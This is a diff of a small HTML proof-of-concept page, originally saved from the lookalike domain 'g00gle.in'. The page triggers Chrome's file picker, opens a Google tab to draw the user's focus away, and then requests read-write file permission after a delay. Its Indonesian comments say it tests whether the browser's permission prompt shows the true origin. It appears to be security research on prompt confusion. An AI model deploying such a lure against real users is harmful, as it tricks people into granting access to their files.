@@ -1,69 +1,49 @@
-<!-- saved from url=(0035)https://g00gle.in/chromepicker.html -->
-<html class="hydrated">
-  <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
-    <style type="text/css" id="operaUserStyle"></style>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/sqrx-email-notifier.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/"
-      data-stencil-namespace="sqrx-email-notifier"
-      id="sqrx-email-notifier"
-    ></script>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/sqrx-dialog.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/"
-      data-stencil-namespace="sqrx-dialog"
-      id="sqrx-dialog"
-    ></script>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/sqrx-notification-bar.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/"
-      data-stencil-namespace="sqrx-notification-bar"
-      id="sqrx-notification-bar"
-    ></script>
-  </head>
-  <body align="center" onclick="load()" style="color: red; font-size: 24px">
-    Click Here
+<body align="center" onclick="load()" style="color: red; font-size: 24px">
+  Click Here to Start Test
 
-    <script>
-      async function load() {
-        window.handle = window.showOpenFilePicker();
-        window.open("https://google.com", "_blank");
-        window.handle = (await window.handle)[0];
-        await window.handle.requestPermission();
-        // ...
-        previewImage();
-      }
+  <script>
+    async function load() {
+      // 1. Pemicu awal File Picker
+      const pickerPromise = window.showOpenFilePicker();
 
-      async function previewImage() {
-        const file = await window.handle.getFile();
-        if (file.type.startsWith("image/")) {
-          const reader = new FileReader();
-          reader.onload = function (event) {
-            const imgElement = document.createElement("img");
-            imgElement.src = event.target.result;
-            document.body.appendChild(imgElement);
-          };
-          reader.readAsDataURL(file);
-        } else {
-          alert("Please choose an image file.");
+      // 2. Segera buka tab Google agar pengguna berpindah fokus
+      window.open("https://google.com", "_blank");
+
+      // 3. Tambahkan jeda (misal: 10 detik) sebelum memproses file yang dipilih
+      // Ini memberikan waktu bagi pengguna untuk berinteraksi di tab Google
+      console.log("Menunggu 10 detik di latar belakang...");
+
+      setTimeout(async () => {
+        try {
+          const handles = await pickerPromise;
+          window.handle = handles[0];
+
+          // Meminta izin (Permission Request) setelah jeda lama
+          // Ini akan menguji apakah UI Chrome menunjukkan origin yang benar
+          // atau membuat user bingung karena muncul setelah mereka di tab Google.
+          await window.handle.requestPermission({ mode: "readwrite" });
+
+          previewImage();
+        } catch (err) {
+          console.log("User membatalkan atau terjadi error: ", err);
         }
-      }
-    </script>
+      }, 5000); // 10000ms = 10 detik
+    }
 
-    <div id="sqrx-content-container">
-      <div class="squarex_ext_modal">
-        <div class="squarex_ext_dialog-container">
-          <div id="module_dialog_root__disposableFileViewer">
-            <div
-              class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"
-            ></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </body>
-</html>
+    async function previewImage() {
+      const file = await window.handle.getFile();
+      if (file.type.startsWith("image/")) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const imgElement = document.createElement("img");
+          imgElement.src = event.target.result;
+          imgElement.style.maxWidth = "500px";
+          document.body.appendChild(imgElement);
+        };
+        reader.readAsDataURL(file);
+      } else {
+        alert("File berhasil diakses, tapi bukan gambar.");
+      }
+    }
+  </script>
+</body>
